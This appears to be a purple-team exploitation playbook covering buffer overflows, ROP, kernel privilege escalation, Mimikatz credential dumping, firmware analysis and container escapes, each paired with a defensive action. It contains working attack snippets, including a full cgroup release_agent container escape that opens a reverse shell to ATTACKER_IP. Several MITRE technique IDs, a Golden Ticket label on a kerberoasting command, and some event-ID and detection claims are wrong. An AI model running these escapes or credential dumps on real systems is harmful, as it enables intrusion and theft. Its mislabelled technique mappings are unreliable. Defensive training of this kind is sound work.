# OS & hardware exploitation playbook

From stack overflows to kernel exploits and next-gen patch analysis

## Linux exploitation

### Basic attacks

#### Stack-based buffer overflow

MITRE: [T1205](https://attack.mitre.org/techniques/T1205/)

Tools:

```bash
# Crash a vulnerable program  
python2 -c 'print "A"*500' | ./vuln_program  
# Find EIP offset with GDB  
gdb -q ./vuln_program  
pattern create 500  
```

#### Exploit development

MITRE: [T1068](https://attack.mitre.org/techniques/T1068/)

Tools:

```python
# Python2 exploit skeleton  
from struct import pack  
buf = "A"*264 + pack("<I", 0xdeadbeef)  # EIP overwrite  
open("payload", "wb").write(buf)  
```

Purple team actions

- [x] Red: Exploit 32-bit binaries with pwntools.
- [x] Blue: Deploy PaX/Grsecurity to enforce NX/ASLR.

## Advanced Linux bypasses

### Attack paths

#### ROP Chaining (NX Bypass)

MITRE: [T1497](https://attack.mitre.org/techniques/T1497/)

Tools:

```bash
# Find gadgets with ROPgadget  
ROPgadget --binary libc.so.6 | grep "pop rdi"  
```

#### ASLR/PIE Leak

MITRE: [T1599](https://attack.mitre.org/techniques/T1599/)

Tools:

```python
# Leak libc address via format string  
payload = "%7$s".ljust(8) + p64(libc.got["puts"])  
```

Purple team actions

- [x] Red: Use angr for automated ROP chain generation.
- [x] Blue: Enable CFI and kernel pointer sanitization.

## Linux kernel exploits

### Attack paths

#### ret2usr (SMEP Bypass)

MITRE: [T1068](https://attack.mitre.org/techniques/T1068/)

Tools:

```c
// Kernel payload to escalate to root  
commit_creds(prepare_kernel_cred(0));  
```

#### KASLR Bypass

MITRE: [T1599](https://attack.mitre.org/techniques/T1599/)

Tools:

```bash
# Leak kernel pointers via /proc/kallsyms  
grep "T startup_64" /proc/kallsyms  
```

Purple team actions

- [x] Red: Test DirtyPipe (CVE-2022-0847).
- [x] Blue: Disable legacy vsyscall and restrict /proc/kallsyms access.

## Windows exploitation

### Basic attacks

#### SEH overwrite

MITRE: [T1205](https://attack.mitre.org/techniques/T1205/)

Tools:

```python
# SEH chain overwrite pattern  
buf = "A"*500 + "\xeb\x06\x90\x90" + pack("<I", 0x62501203)  
```

#### ROP (Bypass DEP)

MITRE: [T1497](https://attack.mitre.org/techniques/T1497/)

Tools:

```bash
# Find gadgets with Mona (Immunity Debugger)  
!mona rop -m kernel32.dll -cpb "\x00\x0a"  
```

Purple team actions

- [x] Red: Exploit Office macros with SharpShooter.
- [x] Blue: Enforce EMET or WDEG.

## Windows kernel exploits

### Attack paths

#### Token stealing

MITRE: [T1098](https://attack.mitre.org/techniques/T1098/)

Tools:

```c
// Kernel shellcode to steal SYSTEM token  
mov rax, [gs:0x188]      // Current thread  
mov rax, [rax+0xb8]      // EPROCESS  
mov rbx, [rax+0x2e8]     // SYSTEM EPROCESS  
```

#### Driver exploitation

MITRE: [T1068](https://attack.mitre.org/techniques/T1068/)

Tools:

```bash
# Find vulnerable drivers with DriverQuery  
driverquery /v | findstr "UNSAFE"  
```

Purple team actions

- [x] Red: Exploit PrintNightmare.
- [x] Blue: Block vulnerable drivers via HVCI.

## PowerShell & post-exploitation

### Attack paths

#### Credential theft

MITRE: [T1003](https://attack.mitre.org/techniques/T1003/)

Tools:

```powershell
# Dump LSASS with Mimikatz  
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'  
```

#### AD Persistence

MITRE: [T1098](https://attack.mitre.org/techniques/T1098/)

Tools:

```powershell
# Golden Ticket attack  
Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt  
```

Purple team actions

- [x] Red: Lateral movement with Rubeus.
- [x] Blue: Monitor for 4624 (Kerberos TGT requests).

## macOS exploitation

XNU Heap Overflow (CVE-2021-30860)

### Attack path

MITRE: [T1068](https://attack.mitre.org/techniques/T1068/)

Exploit Steps:

```c
// Trigger IOMFB vulnerability (simplified)  
io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOMobileFramebuffer"));  
IOConnectCallMethod(service, 78, input, inputCnt, output, &outputCnt);  // OOB write  
```

Purple team actions

- [x] Red: Weaponize with MacDirtyCow (CVE-2022-46689).
- [x] Blue: Enable System Integrity Protection (SIP) and monitor kernel_task crashes.

## Next-Gen patch exploitation

### Attack paths

#### Binary diffing

MITRE: [T1599](https://attack.mitre.org/techniques/T1599/)

Tools:

```bash
# Patch diffing with BinDiff  
bindiff old.exe new.exe  
```

#### 1-Day exploits

MITRE: [T1599](https://attack.mitre.org/techniques/T1599/)

Tools:

```python

# Reverse engineer patch Tuesday updates  
from binaryninja import *  
bv = BinaryViewType.get_view_of_file("patched.dll")  
```

Purple team actions

- [x] Red: Develop exploits from PatchDiffing results.
- [x] Blue: Deploy SigCheck for binary integrity.

## Firmware diffing (UEFI/ACPI)

### Attack paths

#### UEFI vulnerability hunting

MITRE: [T1542.001](https://attack.mitre.org/techniques/T1542/001/)

Tools:

```bash
# Extract firmware with CHIPSEC  
python3 chipsec_util.py spi dump firmware.rom  
# Diff UEFI modules with UEFITool  
uefitool firmware.rom extract -o modules  
```

#### ACPI table tampering

MITRE: [T1542.002](https://attack.mitre.org/techniques/T1542/002/)

Tools:

```bash
# Dump ACPI tables in Linux  
acpidump > acpi.dat  
# Disassemble AML with iasl  
iasl -d dsdt.dat  
```

Purple team actions

- [x] Red: Exploit Thunderstrike (UEFI bootkit).
- [x] Blue: Verify firmware with Linux Vendor Firmware Service.

## Container escape exploits

CVE-2022-0492 (cgroups v1 Release Agent Escape)

### Attack path

MITRE: [T1611](https://attack.mitre.org/techniques/T1611/) (Escape to Host)

Exploit Steps:

```bash
# 1. Check vulnerable cgroups config  
grep cgroup /proc/self/mountinfo | grep release_agent  

# 2. Trigger escape (requires CAP_SYS_ADMIN in container)  
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp  
echo 1 > /tmp/cgrp/notify_on_release  
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)  
echo "$host_path/cmd" > /tmp/cgrp/release_agent  
echo '#!/bin/sh' > /cmd  
echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /cmd  
chmod +x /cmd  
sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"  
```

Purple team actions

- [x] Red: Test escape in Docker/Kubernetes with CDK.
- [x] Blue: Enforce deny mount cgroup in AppArmor.

## Purple team outcomes

### Red team

* Linux: ROP chains bypassing NX+PIE+ASLR.
* Windows: Weaponized Office docs with CVE-2021-40444.
* AD: Golden/Silver ticket attack trees.
* Container: Proof-of-concept for Kubernetes pod → host escapes.
* macOS: Weaponized XNU exploits (e.g., privilege escalation to root).
* Firmware: Mapped UEFI vulnerabilities to ATT&CK for ICS.

### Blue team

* Linux: eBPF-based kernel exploit detection.
* Windows: Attack Surface Reduction rules.
* AD: BloodHound defensive mappings.
* Container: GKE/ECS hardening guides with gVisor.
* macOS: Gatekeeper + XProtect rules.
* Firmware: UEFI Secure Boot enforcement via Microsoft DBX.

### Final deliverable

* Workshop: Kernel exploit lab (Linux/Windows).
* ATT&CK Navigator: Customized Enterprise + ICS layers.
* Patch Analysis: Monthly diffing report template.
